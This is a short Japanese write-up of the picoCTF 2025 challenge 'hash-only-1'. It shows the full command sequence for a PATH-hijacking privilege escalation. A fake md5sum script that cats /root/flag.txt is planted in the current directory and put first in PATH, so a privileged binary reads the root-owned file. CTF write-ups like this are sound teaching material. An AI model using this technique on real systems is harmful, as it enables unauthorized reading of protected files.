# picoCTF2025　hash-only-1

SSH接続できるので、実行ファイルをダウンロードしてghidraにぶちこむ

Functionsからmainを見ると
```
/bin/bash -c \'md5sum /root/flag.txt
```
で表示させていることがわかる
なのでmd5sumをcatに偽装することでflagを得る
catなどは使用不可だった

```
ctf-player@pico-chall$ echo '#!/bin/sh' > ./md5sum
ctf-player@pico-chall$ echo 'cat /root/flag.txt' >> ./md5sum
ctf-player@pico-chall$ chmod +x ./md5sum
```
```
echo '#!/bin/sh' > ./md5sum:
```
今いるディレクトリに md5sum という名前の新しいファイルを作成し、中身を #!/bin/sh としている。これによって、このファイルがシェルスクリプトであることを宣言している。
```
echo 'cat /root/flag.txt' >> ./md5sum
```
作成したmd5sumというファイルに、cat /root/flag.txtというコマンドを書き加える。
```
chmod +x ./md5sum
```
この md5sum ファイルに実行権限を与える。これにより、テキストファイルから実行可能なプログラムファイルになる。
```
ctf-player@pico-chall$ export PATH=.:$PATH
```
PATHとは

PATHには、lsやcatのようなコマンドを実行するときに、どこにそのプログラム本体があるかを探しに行く場所を格納する場所である。通常は/binなどが設定されている。
```
export PATH=.:$PATH
```
このコマンドにより、PATHのリストの一番最初に、カレントディレクトリを追加（```.```で表される）している。
これにより、システムはコマンドを探すときにカレントディレクトリを最初に探す。

```
ctf-player@pico-chall$ ./flaghasher
```
./flaghasherを実行する。
これにより、```/bin/bash -c \'md5sum /root/flag.txt```が```/bin/bash -c \'cat /root/flag.txt```として動く

これによりflagを得ることができる。

### 参考
https://h-takara.hatenablog.com/entry/2025/03/27/213444